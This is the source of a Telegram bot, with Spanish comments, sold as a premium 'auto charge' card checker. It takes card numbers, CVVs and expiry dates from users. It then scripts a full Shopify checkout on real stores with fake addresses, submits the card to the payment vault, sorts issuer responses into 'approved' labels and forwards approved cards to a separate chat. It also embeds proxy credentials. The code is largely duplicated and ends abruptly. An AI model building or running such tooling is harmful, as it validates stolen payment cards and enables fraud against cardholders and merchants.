import json
import base64
import requests
from parse import parseX
import check_template
from bs4 import BeautifulSoup
import datetime
from Plugins.SegundoPlano.antispam import *
import names
from urllib.parse import urlparse
import string
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''

def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False
    




@Client.on_message(filters.regex(r'^[./!?#].*'))
def check_command(client, message):
    command = message.text.split()[0][1:].lower()  # Eliminar el prefijo y convertir a minúscula
    conn = connect_to_db()
    cursor = conn.cursor()
    cursor.execute('SELECT nombre, comando, pagina FROM gateways WHERE comando = ?', (command,))
    datos = cursor.fetchone()
    if datos is None:
        cursor.execute('SELECT nombre, comando, pagina FROM gateways2 WHERE comando = ?', (command,))
        datos = cursor.fetchone()
        if datos is None:
            return
        
        print(datos, "2")
        
        if not is_command_enabled(f"{command}"):
                return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝐌𝐈𝐊𝐀𝐒𝐀 = 𝐂𝐇𝐊✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{datos[0]}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>Auto Charge</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN 
↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
        username = message.from_user.username
        chat_id = message.chat.id
        user_id = message.from_user.id
        command = command
        ID = message.from_user.id
        FIRST = message.from_user.first_name
        spam_message = antispam(user_id, command, message)
        if spam_message is not None:
            message.reply(spam_message)
            return

            
                    
            #--------- VERIFICACION DE BIN BANEADOS ----------#
                
        ccs = message.text[len(f"/{command} "):]  
        reply = message.reply_to_message
                
                
        try:
            if not ccs:
                reply = message.reply_to_message
                texto = reply.text[:6]
            else:
                texto = ccs[:6]
        
            
        
            with open('binban.txt', 'r') as file:
                bins_baneados = file.readlines()
            
            for bin_baneado in bins_baneados:
                if texto.startswith(bin_baneado.strip()[:6]):
                    message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                    return
                
        except:
            return
                
        try:
        
            with open('binban.txt', 'r') as file:
                bins_baneados = file.readlines()
            
            for bin_baneado in bins_baneados:
                if texto.startswith(bin_baneado.strip()[:6]):
                    message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                    return
            
        except:
            pass
                    
        if not datos:
            return
        
        nombre = datos[0]
        comando = datos[1]
        site = datos[2]
        print(nombre)
        
        
        
        ccs = message.text[len(f"/{comando} "):]  
        reply = message.reply_to_message


        if not ccs:
            reply = message.reply_to_message
            tarjeta = reply.text
        else:
            tarjeta = ccs
            
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        if not user_data:
                    return message.reply(f"<b>First, you must register. /register .</b> ")
                
        if user_data[0] in ["Baneado", "baneado"]:
            return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
            
        chat_id2 = message.chat.id
        chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
        chat_data = cursor.fetchone()
        
        if chat_data is None:
            chat_data = "Free"
            
            
            
        if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
                return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
            
        
        
                
        if not ccs:
            if not reply or not reply.text:
                return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>Auto Charge</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

            ccs = reply.text
            

        result = parser_kurama.parseData(ccs)
        x = get_bin_info(ccs[:6])

        if 'error' in result:
            return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{command} Auto Charge</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)

    
        
        
        if "://" in site:
                parsed_url = urlparse(site)
                domain = parsed_url.netloc
                print(site)
        else:
                domain = site
                print(site)

        print("Verificando url:", domain)
        
        
        time.sleep(1)
        
        headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
                }

        resp = requests.get(f"https://{domain}/products.json", headers=headers)
        
        
        try:
            
            if "shopify" in resp.text:
                result = resp.json()['products']
        
            else:
                message.reply('La pagina no es Shopify!')
                return f"『𝑴𝑰𝑲𝑨𝑺𝑨 𝑪𝑯𝑲』\n❌Error-Message❌\nMSG: Revismos dominio '{domain}' y al parecer no es shopify.\nSi crees que es un error, contacta a un [Onwer, Seller, ADM]\nen ocaciones las paginas tienen un login como requisito o tardan mucho tiempo en responde, lo cual no serviria para un gateway"
        except:
            message.reply('Error al obtener el sitio!')
            return f"Error GET site, put data: {site}\nOnly Domanin or view data url"

        min_price = float('inf')
        min_product = None

        for product in result:
            for variant in product['variants']:
                if variant['available'] == True:
                    if float(variant['price']) < min_price and float(variant['price']) > 0.15:
                        min_price = float(variant['price'])
                        min_product = {
                            'title': product['title'],
                            'price': variant['price'],
                            'product_id': variant['id'],
                            'link': product['handle']
                        }

        print("Productos minimos:", min_product)
        if min_product is not None:
            
            p_id = min_product['product_id']
            price = min_product['price']
            enlace = f"https://{domain}/products/{min_product['link']}"


        else:
            message.reply('No se ncontro un precio requerido')
            return "No se encontró ningún producto con el precio mínimo requerido."

        
        print("iD producto sh:", p_id)
        
        
        xx = tarjeta.split("|")
        ccn = xx[0]
        mes = xx[1]
        ano = xx[2]
        cvv = xx[3]
        
        inicio = time.time()
        #---------- PLANTILLA DE CARGA #1 ------------#
        loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]} ${price}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
        
        session = requests.Session()
        session.proxys = {"htpps": "http://ebrnoiak-rotate:30gu8jrxwi1j@p.webshare.io:80"}
        print(f"\n</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
            #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': f'{p_id}'}
        print(payload_1)
            
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        print(domain)

        req1 = session.post(url=f'https://{domain}/cart/add.js', data=payload_1)
        
        print(req1)
        
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        req3 = session.post(url=f"https://{domain}/checkout/")
        
        checkout_url = req3.url
        print("</> CHECKOUT URL:", checkout_url) 
        
        print(price)
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        
        reb = session.get(checkout_url).text
        
        

        
        #obtiene la informacion de direccion
        adds = BeautifulSoup(reb, 'html.parser').find('div', {'class':'field__input-wrapper field__input-wrapper--select'})
        add = str(adds).strip()
        
        try:
        
            if "United States" in add or "None" in add:
                addres = "133 New York 59"
                city = "Monsey"
                state = "NY"
                zip = "10952"
                phone = "(879) 658-2525"
                dicc = r"United States"
            
            elif "Australia" in add:
                addres = "134 Buckhurst Street"
                city = "South Melbourne"
                state = "VIC"#"South Australia"
                zip = "3205"
                phone = "(879) 658-2525"
                dicc = "Australia"
            
            elif "United Kingdom" in add:
                addres = "1251 By Chef James Cochran"
                city = "London"
                state = "London"
                zip = "N1 1QN"
                phone = "(879) 658-2525"
                dicc = "United Kingdom"
                
            elif "Canada" in add:
                addres = "133 Toronto Street South"
                city = "Uxbridge"
                state = "ON"
                zip = "N1 1QN"
                phone = "(879) 658-2525"
                dicc = "Canada"

        except:
            addres = "133 New York 59"
            city = "Monsey"
            state = "NY"
            zip = "10952"
            phone = "(879) 658-2525"
            dicc = "United States"
        
        print("Addres seclecte:", addres)
        
        atoken = get_random_string(86)
        headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

            #-----------PASO N° 4 REEMPLAZAR PAYLOAD #2-------ya----#
        payload_2 = [
        ('_method', 'patch'),
        ('authenticity_token', f'{atoken}'),
        ('previous_step', 'contact_information'),
        ('step', 'shipping_method'),
        ('checkout[email]', 'darwindevoficial@gmail.com'),
        ('checkout[buyer_accepts_marketing]', '0'),
        ('checkout[shipping_address][first_name]', ''),
        ('checkout[shipping_address][last_name]', ''),
        ('checkout[shipping_address][company]', ''),
        ('checkout[shipping_address][address1]', ''),
        ('checkout[shipping_address][address2]', ''),
        ('checkout[shipping_address][city]', ''),
        ('checkout[shipping_address][country]', ''),
        ('checkout[shipping_address][province]', ''),
        ('checkout[shipping_address][zip]', ''),
        ('checkout[shipping_address][phone]', ''),
        ('checkout[shipping_address][country]', f'{dicc}'),
        ('checkout[shipping_address][first_name]', 'Anna'),
        ('checkout[shipping_address][last_name]', 'Smith'),
        ('checkout[shipping_address][company]', ''),
        ('checkout[shipping_address][address1]', f'{addres}'),
        ('checkout[shipping_address][address2]', ''),
        ('checkout[shipping_address][city]', f'{city}'),
        ('checkout[shipping_address][province]', f'{state}'),
        ('checkout[shipping_address][zip]', f'{zip}'),
        ('checkout[shipping_address][phone]', f'{phone}'),
        ('checkout[remember_me]', 'false'),
        ('checkout[remember_me]', '0'),
        ('checkout[client_details][browser_width]', '432'),
        ('checkout[client_details][browser_height]', '780'),
        ('checkout[client_details][javascript_enabled]', '1'),
        ('checkout[client_details][color_depth]', '24'),
        ('checkout[client_details][java_enabled]', 'false'),
        ('checkout[client_details][browser_tz]', '300'),
    ]

        req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
        
        
        #obtener el valor de envio
        point4 = session.get(url=checkout_url+"?previous_step=contact_information&step=shipping_method").text
        
        if "data-shipping-method" in point4:
            try:
                price_send = BeautifulSoup(point4, 'html.parser').find("div", {"class":"radio-wrapper"})["data-shipping-method"]
                
            except:
                price_send = "shopify-UPS%20Ground%20Shipping-0.00"
        else:
            price_send = "shopify-UPS%20Ground%20Shipping-0.00"
        
        print(f"\nSHIPP PRICE:", price_send)
        
        #
        #
        time.sleep(3)
            
            #-----------PASO N° 5 REEMPLAZAR PAYLOAD #3----ya-------#
        payload_3 = {
        '_method': 'patch',
        'authenticity_token': f'{atoken}',
        'previous_step': 'shipping_method',
        'step': 'payment_method',
        'checkout[shipping_rate][id]': f'{price_send}',
        'checkout[client_details][browser_width]': '432',
        'checkout[client_details][browser_height]': '780',
        'checkout[client_details][javascript_enabled]': '1',
        'checkout[client_details][color_depth]': '24',
        'checkout[client_details][java_enabled]': 'false',
        'checkout[client_details][browser_tz]': '300',
    }
            
        req5 = session.post(url=checkout_url,headers=headers,data=payload_3)
        
        point7 = session.get(url=checkout_url+"?previous_step=shipping_method&step=payment_method",).text
        print(2)
        
        #obtine valor de precio = total_prices
        pricos = BeautifulSoup(point7, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})
        
        total_prices = str(pricos).strip()
        
        
        #se trata de obtener el id del gateway de la pagina
        try:
            idpay = BeautifulSoup(point7, 'html.parser').find("ul", {"role":"list"})['data-brand-icons-for-gateway']# error is shopay not shopify
        except:
            msg = 'DECLINED ❌'
            respuesta = "Error get id Gateway, Change Your site."
            total_prices = ""
            print(msg, total_prices)
            proxyy = "DEAD 🟥"
            gateway = f'<code>{datos[0]}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()  
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

            
        
        #precio final con el envio para ingresar al requests
        price_final = BeautifulSoup(point7, 'html.parser').find("span", {"class":"order-summary__emphasis total-recap__final-price skeleton-while-loading"})['data-checkout-payment-due-target']
        
        print(f"Gateway id: {idpay}\nTotal: {price_final}")
        #
        #
            
        time.sleep(3)
        payload_4 = {
                "credit_card": {
                    "number": f"{ccn[0:4]} {ccn[4:8]} {ccn[8:12]} {ccn[12:16]}",
                    "name": "Sin Rol",
                    "month": mes,
                    "year": ano,
                    "verification_value": cvv
                },
                #-----------PASO N° 6 REEMPLAZAR URL DEL SESSION-------ya----#
                "payment_session_scope": f"{domain}"
        }

        req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
        token = req6.json()
        id_ = token.get('id')
        print("</> ID SESSION:", id_)
        time.sleep(2)

            #-----------PASO N° 7 REEMPLAZAR PAYLOAD #5-----------#
        payload_5 = {
        '_method': 'patch',
        'authenticity_token': f'{atoken}',
        'previous_step': 'payment_method',
        'step': '',
        's': f'{id_}',
        'checkout[payment_gateway]': f'{idpay}',
        'checkout[credit_card][vault]': 'false',
        'checkout[different_billing_address]': 'false',
        'checkout[total_price]': f'{price_final}',
        #'checkout_submitted_request_url': 'https://www.toyworld.com.au/34943795332/checkouts/ddaa84bcd63a91d90cdb3f01bdb26fa9?previous_step=shipping_method&step=payment_method',
        #'checkout_submitted_page_id': '682d1a61-2B8E-4933-312D-11A2ADE038F9',
        'complete': '1',
        'checkout[client_details][browser_width]': '432',
        'checkout[client_details][browser_height]': '780',
        'checkout[client_details][javascript_enabled]': '1',
        'checkout[client_details][color_depth]': '24',
        'checkout[client_details][java_enabled]': 'false',
        'checkout[client_details][browser_tz]': '300',
    }
        req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
            
        time.sleep(4)

        processing_url = req7.url
        print("</> PROCESANDO URL:",processing_url)
        time.sleep(4)
            
        req8 = session.get(str(processing_url) + '?from_processing_page=1')
        time.sleep(4)

        req9 = session.get(req8.url)
        time.sleep(1)
        text_resp = req9.text
        resp = find_between(text_resp, 'notice__text">', '<')
        
        print("Resultado Previo:", resp)

        session.close()
        
        end = time.time()
        tiempo = str(inicio - end)[1:5]
            
        #-----------PASO N° 8 REEMPLAZAR RESPONSES DEPENDIENDO EL TIPO DE SHOPIFY-----------#

        cv = ["CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.", "2010 Card Issuer Declined CVV", "Card Issuer Declined CVV", "Security code was not matched by the processor", "CVV2 Mismatch", "CVV Validation Error  Failed", "Security codes does not match correct format (3-4 digits)"]
        #
        
        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):
            msg = f"APPROVED CHARGE ${price}✅"
            resp = 'Charge'
        
        elif "CVV2/CID/CVC2 Data not Verified" in resp:
            msg = f"APPROVED CCN ✅"
                    
        elif "Insufficient Funds" in resp:
            msg = f"APPROVED Low Charge✅ "
                        

        elif resp in cv:
            msg =f"APPROVED CCN ✅"
                
        elif "Address not Verified" in resp:
            msg = f"Approved ✅"

        elif not resp:
            msg = f"Declined❌"#en caso de que el contenedor de la respuesta este vacia.
            
        elif '/3d_secure_2/' in str(req9.url):
                    respuesta = '3d_secure_2'
                    msg = "APPROVED 3D✅"
                        
        elif "Security code was not matched by the processor" in resp:
                        msg = "APPROVED ✅"
                        respuesta = resp
                    
        elif "Insufficient Funds" in resp:
                        msg = "APPROVED ✅"
                        respuesta = resp
                        
                        
        elif "Transaction Normal - Insufficient Funds" in resp:
                        msg = "APPROVED ✅"
                        respuesta = resp
                        
        elif "CVV2/VAK Failure (531)" in resp:
                        msg = "APPROVED ✅"
                        respuesta = resp
    
        elif "CVV2/CID/CVC2 Data not Verified - Declined" in resp:
                        msg = "APPROVED CCN✅"
                        respuesta = resp
                    

        elif "Address not Verified - Insufficient Funds" in resp:
                        msg = "APPROVED ✅"
                        respuesta = resp

                        
        elif "CVV2/CID/CVC2 Data not Verified - Insufficient Funds" in resp:
                        msg = "APPROVED CVV✅"
                        respuesta = resp
                        
        elif "Address not Verified - Approved" in resp:
                        msg = "APPROVED AVS✅"
                        respuesta = "AVS MISMATCH /", resp

        elif "Security codes does not match correct format (3-4 digits)" in resp:
                        msg = "APPROVED CCN✅"
                        respuesta = resp

        else:
                        msg = "DECLINED ❌"    
                        respuesta = resp    

      
        print(f"CC: {tarjeta}\nRespo: {msg}")
        
        proxyy = "LIVE 🟩" 
        if "APPROVED" in msg:
            
            chat_id = -1002166951118
        
            client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, 'AutoShop', tiempo, username, datos[0], proxyy))
            

        proxyy = "LIVE 🟩" 
        
        print("checking no currier")
        
        return loading_message.edit_text(f"""<a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a><b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]} ${price}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>{msg}</b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ {resp}
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Proxy  ↯ <code>{proxyy}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Time taken ↯ <code>{tiempo} (segundos)</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5 </b>""")

        
        
    print(datos, "1")
    
        
    if not is_command_enabled(f"{command}"):
                return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{datos[0]}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>Auto Charge</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN 
↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return

        
                
        #--------- VERIFICACION DE BIN BANEADOS ----------#
            
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
            
            
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        return
            
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
                
    if not datos:
        return
    
    nombre = datos[0]
    comando = datos[1]
    site = datos[2]
    print(nombre)
    
    
    
    ccs = message.text[len(f"/{comando} "):]  
    reply = message.reply_to_message


    if not ccs:
        reply = message.reply_to_message
        tarjeta = reply.text
    else:
        tarjeta = ccs
        
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
        
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
        
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
    
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>Auto Charge</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
            

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{command} Auto Charge</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)

    
        
        
    if "://" in site:
            parsed_url = urlparse(site)
            domain = parsed_url.netloc
            print(site)
    else:
            domain = site
            print(site)

    print("Verificando url:", domain)
    
    
    time.sleep(1)
    
    headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
            }

    resp = requests.get(f"https://{domain}/products.json", headers=headers)
    
    
    try:
        
        if "shopify" in resp.text:
            result = resp.json()['products']
       
        else:
            message.reply('La pagina no es Shopify!')
            return f"『𝑴𝑰𝑲𝑨𝑺𝑨 𝑪𝑯𝑲』\n❌Error-Message❌\nMSG: Revismos dominio '{domain}' y al parecer no es shopify.\nSi crees que es un error, contacta a un [Onwer, Seller, ADM]\nen ocaciones las paginas tienen un login como requisito o tardan mucho tiempo en responde, lo cual no serviria para un gateway"
    except:
        message.reply('Error al obtener el sitio!')
        return f"Error GET site, put data: {site}\nOnly Domanin or view data url"

    min_price = float('inf')
    min_product = None

    for product in result:
        for variant in product['variants']:
            if variant['available'] == True:
                if float(variant['price']) < min_price and float(variant['price']) > 0.15:
                    min_price = float(variant['price'])
                    min_product = {
                        'title': product['title'],
                        'price': variant['price'],
                        'product_id': variant['id'],
                        'link': product['handle']
                    }

    print("Productos minimos:", min_product)
    if min_product is not None:
        
        p_id = min_product['product_id']
        price = min_product['price']
        enlace = f"https://{domain}/products/{min_product['link']}"


    else:
        message.reply('No se ncontro un precio requerido')
        return "No se encontró ningún producto con el precio mínimo requerido."

    
    print("iD producto sh:", p_id)
    
    
    xx = tarjeta.split("|")
    ccn = xx[0]
    mes = xx[1]
    ano = xx[2]
    cvv = xx[3]
    
    inicio = time.time()
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{datos[0]} ${price}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
        
    session = requests.Session()
